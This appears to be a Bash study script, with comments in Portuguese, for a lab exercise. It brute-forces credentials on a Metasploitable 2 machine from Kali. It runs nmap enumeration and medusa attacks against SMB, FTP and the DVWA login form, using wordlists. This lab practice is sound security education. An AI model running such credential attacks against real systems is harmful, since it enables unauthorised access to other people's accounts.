#!/bin/bash
# Script de automação para testes de Brute Force (Estudo DIO)
# Ambiente: Kali Linux -> Metasploitable 2

IP="192.168.56.4"
USERLIST="../wordlists/users.txt"
PASSLIST="../wordlists/pass.txt"

echo "========================================"
echo " Iniciando testes de brute force no lab "
echo " Alvo: $IP"
echo "========================================"
echo

echo "[1/4] Enumeração inicial..."
nmap -sV -Pn -p 21,80,139,445 "$IP"
echo

echo "[2/4] Iniciando ataque SMB..."
medusa -h "$IP" -U "$USERLIST" -P "$PASSLIST" -M smbnt -t 6
echo

echo "[3/4] Iniciando ataque FTP..."
medusa -h "$IP" -U "$USERLIST" -P "$PASSLIST" -M ftp -t 6
echo

echo "[4/4] Tentativa de automação Web (DVWA)..."
echo "OBS: esta etapa pode gerar falsos positivos no login principal do DVWA."
medusa -h "$IP" -U "$USERLIST" -P "$PASSLIST" -M http \
  -m PAGE:"/dvwa/login.php" \
  -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
  -m "FAIL=Login failed" -t 6
echo

echo "========================================"
echo " Testes finalizados "
echo "========================================"
echo
echo "Validações manuais sugeridas:"
echo " - FTP: ftp $IP"
echo " - SMB: smbclient -L //$IP/ -U msfadmin"
echo " - DVWA: http://$IP/dvwa/login.php"
